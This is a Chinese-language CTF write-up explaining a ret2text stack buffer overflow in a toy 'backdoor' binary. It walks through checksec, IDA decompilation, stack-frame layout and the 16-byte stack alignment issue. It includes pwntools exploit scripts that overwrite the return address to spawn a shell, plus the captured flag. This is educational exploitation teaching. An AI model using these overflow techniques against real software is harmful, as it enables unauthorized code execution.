# backdoor - WriteUp

> [!TIP]
> :heavy_check_mark: 完整 exploit 代码见文末

> 本题知识点：  
> :star: 基本的 `ret2text` 型攻击

## checksec

拿到题目后，先执行一次**checksec**获取基本信息。

```bash
$ checksec --file=pwn
Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

可以看到，**PIE没有开启**，这意味着反编译得到的地址和程序运行时实际装载的地址是**相同的**，  
从而可以轻易地通过IDA等反编译工具得到后门函数的运行期地址。  

## IDA Pro 反编译

通过 *IDA Pro* 反编译后，我们得到了main函数的伪代码，如下：

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  init(a1: argc, a2: argv, a3: envp);
  vuln();
  return 0;
}
```

显然应该从`vuln`入手。
  
双击`vuln`，阅读其代码：

```c
ssize_t vuln()
{
  int v1; // [rsp+Ch] [rbp-44h] BYREF
  _BYTE buf[64]; // [rsp+10h] [rbp-40h] BYREF

  puts(s: aMaybeIfYouGive);
  puts(s: "So how many do you want to give?");
  __isoc99_scanf(a1: "%d", &v1);
  puts(s: "Now plz give it to me");
  if ( v1 <= 0 )
  {
    puts(s: "Don't get cute with me and I am not the genie.");
    exit(status: 0);
  }
  return read(fd: 0, buf, nbytes: v1);
}
```

注意到第二次输入的内容长度由我们控制，并且未加以限制，于是我们可以向`buf`中写入过量内容导致溢出。

*IDA Pro* 在反编译的同时给出了局部变量的栈偏移信息。  
可以看到，`buf`位于`rbp-40h`位置上，  
如果我们额外写入，就会覆盖到`rbp`指向的地址和更高地址上的内容。

程序运行时，栈帧的结构大致如下表（假设当前函数为`callee`，调用者为`caller`）：

|地址|内容|
|-|-|
|$rbp+8k \ (k \ge 2)$|参数|
|$rbp+8$|返回地址（`caller`中调用`callee`的指令的下一条）|
|$rbp$|旧rbp（`caller`栈帧时`rbp`的值）|
|$rbp-8k \ (k \ge 1)$|局部变量|  
  
由此可知，如果我们写入了 $80$ 字节的内容，就能覆盖掉**旧rbp**以及**返回地址**。在这里，我们仅需关心**返回地址**即可。
  
## 第一次编写 Exploit

有了以上分析，我们不难写出第一版的 exploit 代码：

```python
from pwn import *
context(os='linux', arch='amd64')

port = 0
r = remote('localhost', port) if port != 0 else process('./pwn')
win = 0x401209

r.sendlineafter(b'So how many do you want to give?\n', f'{0x50}'.encode())
r.send(b'A' * 0x48 + p64(win))
r.interactive()
```

运行！拿到shell了......吗？

这时候，你随便输入一个命令就会发现，程序直接报了`SIGSEGV`崩掉了。（恭喜你踩了每个pwn初学者必踩的坑）

这是为何？

## 调用约定

原来，Linux x86_64的调用约定`System V AMD64 ABI` 要求 `rsp` 在 `call` 指令前是 **16字节对齐** 的，而我们在跳转至`backdoor`时没有正确对齐，导致了崩溃。

### 函数序言与尾声

```asm
; 标准函数序言
my_function:
    push rbp           ; 保存调用者的 rbp
    mov  rbp, rsp      ; 设置当前函数的基址
    sub  rsp, N        ; 分配 N 字节局部变量空间
    ; ...
    ; 函数体
    ; ...
    mov  rsp, rbp      ; 撤销局部变量空间（函数尾声开始）
    pop  rbp           ; 恢复调用者的 rbp
    ret                ; 返回
```  

> 注：`pop rbp; ret`两条指令有时会写成单个`leave`指令，二者是等价的。

```mermaid
flowchart TD
subgraph Frame[栈帧布局 从高地址到低地址]
    Arg[调用者参数] --> Ret[返回地址]
    Ret --> SavedRBP[保存的 rbp]
    SavedRBP --> Local1[局部变量 1]
    Local1 --> Local2[局部变量 ...]
    Local2 --> LocalN[局部变量 N]
end
```  

> 以上内容摘自[x86_64汇编语言教程](https://x86-64-assembly.readthedocs.io/zh-cn/latest/chapter_04_subroutines/02_stack_frames.html)
  
### 16字节对齐

进一步分析，`call callee`指令的作用为：

1. 将该指令的下一条指令的地址入栈 :warning:
2. 跳转至`callee`的地址

注意：  
标注 :warning: 的地方会使`rsp`偏移**8个字节**，而函数序言中也会便`rsp`偏移**8个字节**，最终使`rsp`保持**16字节对齐**。  
而在尾声中，`pop`和`ret`指令分别使`rsp`**两次**减去 $8$ ，保证了**16字节对齐**。

然而，我们通过**篡改返回地址**直接跳转，并没有走`call`的流程，于是函数序言使得`rsp`不再处于**16字节对齐**的状态，从而崩溃。
  
想要解决这个问题，一般有两种惯用法：

- 跳过函数序言的`push`指令  
- 在中间插入一个`ret`指令  
  
其中我采用了后者。下面将对两种方法同时做出讲解。
  
## 正确的 Exploit

### 跳过函数序言的`push`指令

在*IDA Pro*中查看`backdoor`的反汇编结果，如下：

```asm
.text:0000000000401209 backdoor        proc near
.text:0000000000401209 ; __unwind {
.text:0000000000401209                 endbr64
.text:000000000040120D                 push    rbp
.text:000000000040120E                 mov     rbp, rsp
.text:0000000000401211                 lea     rax, s          ; "If it's enough,you can get anything you"...
.text:0000000000401218                 mov     rdi, rax        ; s
.text:000000000040121B                 call    _puts
.text:0000000000401220                 lea     rax, command    ; "/bin/sh"
.text:0000000000401227                 mov     rdi, rax        ; command
.text:000000000040122A                 call    _system
.text:000000000040122F                 nop
.text:0000000000401230                 pop     rbp
.text:0000000000401231                 retn
.text:0000000000401231 ; } // starts at 401209
.text:0000000000401231 backdoor        endp
```

函数入口的地址为`0x401209`，跳过`push`指令则应将地址修正为`0x40120E`，修正后的 exploit 如下：

```python
from pwn import *
context(os='linux', arch='amd64')

port = 0
r = remote('localhost', port) if port != 0 else process('./pwn')
win = 0x40120E

r.sendlineafter(b'So how many do you want to give?\n', f'{0x50}'.encode())
r.send(b'A' * 0x48 + p64(win))
r.interactive()
```  

```bash
$ cat flag
moectf{Y0u_G4v3_3n0ugh_4nd_Ret_2_TEXT_5ucessfu11y}
```

成功拿下flag！
  
### 在中间插入一个`ret`指令

我们知道，`ret`指令的原理是**从栈上pop一个地址并跳转**，  
那么我们如插入一个`ret`指令的地址，再在其后面接上目标地址，就能解决**16字节对齐**问题了！

使用`ROPgadget`工具查找一下可用的`ret`指令：

```bash
$ ROPgadget --bin pwn --only ret
Gadgets information
============================================================
0x000000000040101a : ret
0x000000000040105a : ret 0xffff

Unique gadgets found: 2
```

修改一下 exploit：

```python
from pwn import *
context(os='linux', arch='amd64')

port = 0
r = remote('localhost', port) if port != 0 else process('./pwn')
win = 0x401209
ret = 0x40101A

r.sendlineafter(b'So how many do you want to give?\n', f'{0x58}'.encode())
r.send(b'A' * 0x48 + p64(ret) + p64(win))
r.interactive()
```  

```bash
$ cat flag
moectf{Y0u_G4v3_3n0ugh_4nd_Ret_2_TEXT_5ucessfu11y}
```

成功拿下flag！  
